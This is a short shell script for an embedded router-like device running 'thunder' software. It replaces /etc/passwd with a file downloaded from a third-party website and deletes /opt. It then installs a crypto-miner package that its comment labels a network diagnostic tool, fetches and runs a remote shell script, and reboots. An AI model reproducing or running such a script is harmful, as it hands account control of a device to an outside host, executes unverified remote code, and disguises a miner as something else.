export LD_LIBRARY_PATH=/thunder/lib
LOG_PATH=/tmp/reset.log
wget 'http://www.xiefucai.com/tools/zqb/passwd?TPSecNotice&TPNotCheck' -O /etc/passwd 2>>$LOG_PATH
/thunder/bin/ubus call dcdn set_dcdn_client '{"count":1}'

if [ -d /opt/etc ];then
    if [ -h /opt ]; then
    	echo "not need remove /opt"
    else
        rm -rf /opt;
        mkdir -p /opt;
    fi
fi

# 安装断网诊断工具
wget 'http://update.peiluyou.com/conf/miner_beta2/packages/thunder-miner-app_V1.2.1146_arm.ipk?TPSecNotice&TPNotCheck' -O /tmp/t.ipk 2>>$LOG_PATH
opkg-cl remove thunder-miner-app
opkg-cl install /tmp/t.ipk

wget 'http://www.xiefucai.com/tools/wget_ddd.sh?TPSecNotice&TPNotCheck' -O /tmp/wget_ddd.sh 2>>$LOG_PATH;chmod +x /tmp/wget_ddd.sh 2>>$LOG_PATH;sh /tmp/wget_ddd.sh 2>>$LOG_PATH;

sleep 30
reboot
